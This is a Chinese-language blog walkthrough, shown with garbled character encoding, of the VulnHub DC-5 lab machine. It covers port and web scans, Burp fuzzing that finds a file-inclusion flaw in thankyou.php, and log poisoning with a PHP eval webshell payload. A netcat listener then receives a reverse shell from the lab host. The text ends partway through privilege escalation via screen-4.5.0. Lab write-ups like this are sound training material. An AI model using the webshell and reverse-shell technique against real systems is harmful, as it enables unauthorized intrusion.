<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  DC:5 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  DC:5</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-02T12:30:40.240Z" id="date"> 2023-06-02</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-03T11:17:34.449Z" id="updated"> 2023-06-03</time></div></span><br><span>Word Count: <div class="control">2.1k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/5cf04a9ee1d4f70c20efa851896c1d440ef07f8f4a6a512376030817ec0bb6fb.jpg'><img src="/pic/5cf04a9ee1d4f70c20efa851896c1d440ef07f8f4a6a512376030817ec0bb6fb.jpg" alt="5cf04a9ee1d4f70c20efa851896c1d440ef07f8f4a6a512376030817ec0bb6fb"></p>
<span id="more"></span>

<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>DC-5ï¼Œå¼€å§‹ä¸Šéš¾åº¦äº†ï¼Œä¸»è¦è€ƒå¯¹æ–‡ä»¶åŒ…å«çš„ç†è§£ï¼Œè€ƒåœ¨å‘ç°æ–‡ä»¶åŒ…å«æ¼æ´çš„å­˜åœ¨åï¼Œè¯¥æŸ¥çœ‹å“ªäº›ä¿¡æ¯ï¼Œå¦‚ä½•åˆ©ç”¨æ–‡ä»¶åŒ…å«get shellã€‚ææƒéƒ¨åˆ†å’Œè§£äº†ã€‚</p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>Port Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:37 CST<br>Warning: 192.168.56.114 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.114<br>Host is up (0.00050s latency).<br>Not shown: 37405 filtered tcp ports (no-response), 28127 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>49405/tcp open  unknown<br>MAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 116.67 seconds<br></code></pre></td></tr></table></figure>


<p>TCP, Service, OS Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:39 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.114<br>Host is up (0.00093s latency).<br><br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    nginx 1.6.2<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>49405/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.06 seconds<br></code></pre></td></tr></table></figure>


<p>UDP Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:39 CST<br>Warning: 192.168.56.114 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.114<br>Host is up (0.0016s latency).<br>Not shown: 65458 open|filtered udp ports (no-response), 75 closed udp ports (port-unreach)<br>PORT      STATE SERVICE<br>111/udp   open  rpcbind<br>40520/udp open  unknown<br>MAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 72.85 seconds<br></code></pre></td></tr></table></figure>


<p>Simple Vuln Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 20:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.114<br>Host is up (0.00022s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>80/tcp  open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.114<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.114:80/contact.php<br>|     Form <span class="hljs-built_in">id</span>: fname<br>|_    Form action: thankyou.php<br>111/tcp open  rpcbind<br>MAC Address: 08:00:27:70:CC:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 74.57 seconds<br></code></pre></td></tr></table></figure>


<p>nikto Vuln Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.114<br>+ Target Hostname:    192.168.56.114<br>+ Target Port:        80<br>+ Start Time:         2023-06-02 20:41:49 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: nginx/1.6.2<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /<span class="hljs-comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br>+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host<br>+ End Time:           2023-06-02 20:42:12 (GMT8) (23 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>


<p>web fingerprint Scan:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.114 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.6.2], IP[192.168.56.114], Title[Welcome], nginx[1.6.2]<br></code></pre></td></tr></table></figure>


<p>Simple Web content discovery:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Fri Jun  2 20:42:19 2023<br>URL_BASE: http://192.168.56.114/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.56.114/ ----<br>==&gt; DIRECTORY: http://192.168.56.114/css/                                                                                                                                                  <br>==&gt; DIRECTORY: http://192.168.56.114/images/                                                                                                                                               <br>+ http://192.168.56.114/index.php (CODE:200|SIZE:4025)                                                         <br>---- Entering directory: http://192.168.56.114/css/ ----<br>                                  <br>---- Entering directory: http://192.168.56.114/images/ ----<br>                                  <br>-----------------<br>END_TIME: Fri Jun  2 20:42:25 2023<br>DOWNLOADED: 13836 - FOUND: 1<br><br></code></pre></td></tr></table></figure>

<p>dirbæ²¡å•¥ä¿¡æ¯å°±ç”¨feroxbusterå†æ‰«ä¸€ä¸‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/vulnhub/DC/5/workSpace]<br>â””â”€$ sudo feroxbuster -u http://192.168.56.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401,403                    <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher ğŸ¤“                 ver: 2.10.0<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> ğŸ¯  Target Url            â”‚ http://192.168.56.114<br> ğŸš€  Threads               â”‚ 50<br> ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br> ğŸ‘Œ  Status Codes          â”‚ [200, 301, 302, 401, 403]<br> ğŸ’¥  Timeout (secs)        â”‚ 7<br> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.0<br> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml<br> ğŸ”  Extract Links         â”‚ <span class="hljs-literal">true</span><br> ğŸ  HTTP methods          â”‚ [GET]<br> ğŸ”ƒ  Recursion Depth       â”‚ 4<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>301      GET        7l       12w      184c http://192.168.56.114/images =&gt; http://192.168.56.114/images/<br>200      GET      145l      343w     2638c http://192.168.56.114/css/styles.css<br>200      GET       54l      560w     4292c http://192.168.56.114/about-us.php<br>200      GET       52l      525w     4100c http://192.168.56.114/solutions.php<br>200      GET       58l      752w     5645c http://192.168.56.114/faq.php<br>200      GET       54l      525w     4025c http://192.168.56.114/index.php<br>200      GET       72l      479w     4282c http://192.168.56.114/contact.php<br>200      GET       54l      525w     4025c http://192.168.56.114/<br>403      GET        7l       10w      168c http://192.168.56.114/css/<br>301      GET        7l       12w      184c http://192.168.56.114/css =&gt; http://192.168.56.114/css/<br></code></pre></td></tr></table></figure>

<p>æ€»è®¡ä¸€ä¸‹ï¼Œæœ€ç»ˆæ‰«å‡ºæ¥çš„æœ‰ç”¨ä¿¡æ¯å°±æ˜¯80ç«¯å£è·‘ç€nginxæœåŠ¡æ­çš„ç½‘ç«™ã€‚</p>
<p>ä¸”ç›®å½•æ‰«æä¹Ÿæ²¡æœ‰å¤ªå¤šçš„æ”¶è·ã€‚åªèƒ½æ­»æ€¼ç½‘ç«™äº†ã€‚</p>
<h2 id="webæ¸—é€"><a href="#webæ¸—é€" class="headerlink" title="webæ¸—é€"></a>webæ¸—é€</h2><h3 id="æŸ¥çœ‹ç½‘é¡µ"><a href="#æŸ¥çœ‹ç½‘é¡µ" class="headerlink" title="æŸ¥çœ‹ç½‘é¡µ"></a>æŸ¥çœ‹ç½‘é¡µ</h3><p>å‰å‡ ä¸ªé¡µé¢æ¥å›çœ‹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ã€‚contacté¡µé¢çš„è¾“å…¥æ¡†å°è¯•åŠ å•å¼•å·<code>&#39;</code>æµ‹è¯•SQLæ³¨å…¥ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç»“æœã€‚ä½†æ˜¯åœ¨æ¥å›æµ‹è¯•å…¶ä»–å¯èƒ½çš„sqlæ³¨å…¥çš„å¯èƒ½æ—¶ï¼Œå‘ç°thankyou.phpåº•ä¸‹çš„footerçš„å¹´ä»½åœ¨å˜åŒ–ã€‚</p>
<p class='item-img' data-src='/pic/assets/dc5-contact-1.png'><img src="/pic/assets/dc5-contact-1.png" alt="dc5-contact-1"></p>
<p class='item-img' data-src='/pic/assets/dc-5-contact-2.png'><img src="/pic/assets/dc-5-contact-2.png" alt="dc-5-contact-2"></p>
<p>è¿™ä¸œè¥¿ä¸ºå•¥ä¼šå˜ï¼Œå¾ˆå¥‡æ€ªã€‚F12æ‰“å¼€æ§åˆ¶å°å‘ç°footeréƒ¨åˆ†æ˜¯ä¸€ä¸ªfooter-warperã€‚</p>
<p class='item-img' data-src='/pic/assets/dc-5-footer-wrapper.png'><img src="/pic/assets/dc-5-footer-wrapper.png" alt="dc-5-footer-wrapper"></p>
<p>ç»“åˆä¹‹å‰ç›®å½•æ‰«æå‘ç°çš„footer.phpé¡µé¢ï¼Œæˆ‘ä»¬æ‰“å¼€footer.phpé¡µé¢åˆ·æ–°å‡ æ¬¡ï¼Œå‘ç°å…¶å€¼ç¡®å®æ˜¯åœ¨å˜åŒ–ã€‚</p>
<p class='item-img' data-src='/pic/assets/dc-5-footer.png'><img src="/pic/assets/dc-5-footer.png" alt="dc-5-footer"></p>
<p>è¿™ä»¥ä¸Šä¿¡æ¯è¯´æ˜äº†ä»€ä¹ˆå‘¢ï¼Ÿè¯´æ˜äº†thankyou.phpåº•ä¸‹è‚¯å®šincludeäº†footer.phpã€‚ä½†æ˜¯ï¼Œä»–åˆ°åº•ä»€ä¹ˆæ€ä¹ˆincludeçš„ï¼Œæ˜¯å†™æ­»çš„è¿˜æ˜¯ä¼ å‚çš„æˆ‘ä»¬ä¸å¾—è€ŒçŸ¥ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•fuzzä¸€ä¸‹ï¼Œæ¯•ç«Ÿæ²¡è·¯äº†ï¼Œåªèƒ½è¯•è¯•è¿™ä¸ªäº†ã€‚å°±å½“ä»–æ˜¯æ¥å—å‚æ•°åŒ…å«è¿›å»çš„ã€‚</p>
<h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><p>æˆ‘ä»¬è¦fuzzä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ªæ˜¯æ¥æ”¶çš„å‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶ä½ç½®ã€‚</p>
<p class='item-img' data-src='/pic/assets/dc5-bp-1.png'><img src="/pic/assets/dc5-bp-1.png" alt="dc5-bp-1"></p>
<p>æˆ‘ä»¬ç›´æ¥ç”¨burpsuiteé‡Œçš„intruderè¿›è¡Œfuzzã€‚ç”¨intruderæœ‰ä¸ªå¥½å¤„åœ¨äºå®ƒé‡Œé¢å†…ç½®äº†å‚æ•°ä»¥åŠæ–‡ä»¶éå†çš„å­—å…¸ï¼Œæˆ‘ä»¬ç›´æ¥é€‰pitchforkæ¨¡å¼å¼€å§‹ç”¨å°±è¡Œã€‚å­—å…¸ä¸€å˜é‡æˆ‘é€‰çš„æ˜¯<code>Server-side variable names</code>,å­—å…¸äºŒä½ç½®ç›´æ¥é€‰<code>Fuzzing - path travesal (single file)</code>å°±å¯ä»¥ã€‚</p>
<p class='item-img' data-src='/pic/assets/dc5-bp-2.png'><img src="/pic/assets/dc5-bp-2.png" alt="dc5-bp-2"></p>
<p>æˆ‘ä»¬å‘ç°å…¶ç¡®å®æ˜¯ç”¨çš„<code>file</code>æ¥å—å‚æ•°ã€‚</p>
<p>é‚£æˆ‘ä»¬æ‰‹åŠ¨éªŒè¯ä¸€ä¸‹ï¼š<br class='item-img' data-src='/pic/assets/dc5-lfi-manual.png'><img src="/pic/assets/dc5-lfi-manual.png" alt="dc5-lfi-manual"></p>
<p>å‘ç°éå¸¸OKã€‚</p>
<p>ç„¶è€Œï¼Œç°åœ¨è¿˜æœ‰ä¸€ä¸ªé‡å¤§é—®é¢˜å°±æ˜¯æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ã€‚é‚£æˆ‘ä»¬å¦‚ä½•æ‹¿shellï¼Ÿ</p>
<p>ä¸Šç½‘æŸ¥äº†ä¸‹ï¼Œå‘ç°nginxå­˜åœ¨æ–‡ä»¶åŒ…å«æ—¶å¯ä»¥å°è¯•å¾€é”™è¯¯æ—¥å¿—ä»¥åŠè®¿é—®æ—¥å¿—å†™å…¥ä¸€å¥è¯æœ¨é©¬ç„¶åç”¨èšå‰‘è¿æ¥ã€‚ç„¶è€Œï¼Œé—®é¢˜åˆæ¥äº†ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“è¿™äº›æ—¥å¿—åœ¨å“ªï¼Œè™½ç„¶ä¸€èˆ¬æ¥è¯´ç¡®å®æ˜¯åœ¨<code>/var/log</code>ä¸‹,ä½†æ˜¯ä¹Ÿå¯èƒ½æ”¾åœ¨å…¶ä»–åœ°æ–¹ã€‚æˆ‘ä»¬ç”¨å­—å…¸æšä¸¾ä¸€ä¸‹å¯èƒ½çš„åœ°æ–¹å§ï¼Œä¸€æ ·ç”¨çš„æ˜¯burpsuiteï¼Œä¸è¿‡è¿™æ¬¡ç”¨sniperæ¨¡å¼å³å¯ï¼Œå­—å…¸é€‰<code>Local files - Linux</code>ã€‚</p>
<p class='item-img' data-src='/pic/assets/dc5-errorlog.png'><img src="/pic/assets/dc5-errorlog.png" alt="dc5-errorlog"></p>
<p>ä½ç½®å‘ç°ï¼Œç¡®å®æ˜¯åœ¨<code>/var/log/nginx/error.log</code>ã€‚é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯æ„é€ payloadå†™å…¥é”™è¯¯æ—¥å¿—ä¸­äº†ã€‚</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>æˆ‘ä»¬ç›´æ¥ç®€å•ç²—æš´æ„é€ ä¸€æ¡:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.56.114/thankyou.php?file=&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥ä»¥ä¸€å¥è¯æœ¨é©¬ä½œä¸ºæ–‡ä»¶åï¼Œæ˜¾ç„¶åŒ…å«ä¸åˆ°ï¼Œå› æ­¤å°±ä¼šå†™å…¥åˆ°é”™è¯¯æ—¥å¿—ä¸­ã€‚</p>
<p>éªŒè¯ä¸€ä¸‹ï¼š</p>
<p class='item-img' data-src='/pic/assets/dc5-errorlog-cat.png'><img src="/pic/assets/dc5-errorlog-cat.png" alt="dc5-errorlog-cat"></p>
<p>å‘ç°ç¡®å®å†™å…¥äº†ã€‚</p>
<p>èšå‰‘è¿ä¸€ä¸‹ã€‚</p>
<p class='item-img' data-src='/pic/assets/dc-5-antsword.png'><img src="/pic/assets/dc-5-antsword.png" alt="dc-5-antsword"></p>
<p>æˆåŠŸè¿æ¥ï¼Œç›´æ¥å‘&#x2F;tmpå†™å…¥ä¸€ä¸ªåå¼¹shellï¼Œç„¶åæ–‡ä»¶åŒ…å«è¯·æ±‚ä¸€ä¸‹å°±æ‹¿åˆ°åå¼¹shelläº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ sudo nc -lvp 443                   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>192.168.56.114: inverse host lookup failed: Unknown host<br>connect to [192.168.56.144] from (UNKNOWN) [192.168.56.114] 53100<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (482): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@dc-5:~/html$<br></code></pre></td></tr></table></figure>

<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä¸Šæ¥å…ˆ<code>sudo -l</code>,æ²¡ttyï¼Œpython importä¸€ä¸‹ï¼Œå†æ¬¡sudoå‘ç°æ²¡å¯†ç ã€‚è¡Œå§ã€‚</p>
<p>çœ‹çœ‹set suid çš„binã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-5:/etc$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨gtfobinsæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°<code>screen-4.5.0</code>å¯ä»¥åˆ©ç”¨ç”¨äºå†™æ–‡ä»¶ã€‚</p>
<p>ç„¶è€Œå°è¯•ä¹‹åå¹¶æ²¡èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå„ç§å†™å…¥å¤±è´¥ã€‚é‚£å°±æ‰¾æ‰¾å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œåœ¨searchsploitæœäº†ä¸€ä¸‹å‘ç°è¿˜çœŸæœ‰expã€‚</p>
<p>ä¸‹è½½ä¸‹æ¥è¿è¡Œå¤±è´¥äº†ã€‚æŸ¥äº†ä¸€ä¸‹ç½‘ä¸Šï¼Œè¯´æ˜¯æ‹†æˆä¸‰ä¸ªæ–‡ä»¶ç„¶åæœ¬åœ°ç¼–è¯‘å®Œå†ä¼ åˆ°é¶æœºã€‚</p>
